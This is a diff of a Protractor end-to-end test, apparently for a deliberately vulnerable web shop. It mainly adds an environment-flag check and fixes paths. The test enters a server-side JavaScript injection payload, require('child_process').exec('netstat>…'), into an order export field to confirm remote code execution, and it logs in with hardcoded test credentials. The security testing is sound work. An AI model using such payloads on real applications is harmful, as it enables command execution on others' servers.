@@ -1,25 +1,33 @@
 'use strict';
 const path = require('path');
 const glob = require("glob");
-const HelperFunctions = require('./helperFunctions.js');
+const HelperFunctions = require('../helperFunctions.js');
 
-describe('RCE Injection', () => {
+describe('RCE Injection', function () {
 
-    beforeEach(() => {
+    beforeEach(function () {
         HelperFunctions.login(browser, 'customer0', 'compass0');
     });
 
-    afterEach(() => {
+    afterEach(function () {
         HelperFunctions.logout(browser);
     });
 
-    describe('Try to run netstat command', () => {
+    describe('Environment Variable Check', function () {
+        it('should be on', function () {
+            if (process.env.NODE_RCE_EVAL !== 'ON' && process.env.NODE_RCE_EVAL !== 'on') {
+                fail("Environment Variable not set");
+            }
+        });
+    });
 
-        beforeEach(() => {
+    describe('Try to run netstat command', function () {
+
+        beforeEach(function() {
             browser.get(browser.params.webshop);
         });
 
-        it('should be successfully', () => {
+        it('should be successfully', function () {
             let fileName = 'rceInjection.txt';
 
             element.all(by.css('.glyphicon.glyphicon-user')).get(0).click();
@@ -32,7 +40,7 @@ describe('RCE Injection', () => {
             element(by.model('orders.export.range')).sendKeys("require('child_process').exec('netstat>" + fileName + "')");
             element(by.buttonText('Export pdf')).click();
 
-            let filePath = '../../' + fileName;
+            let filePath = '../../../' + fileName;
 
             browser.driver.wait(() => {
                 let filesArray = glob.sync(path.join(__dirname, filePath));
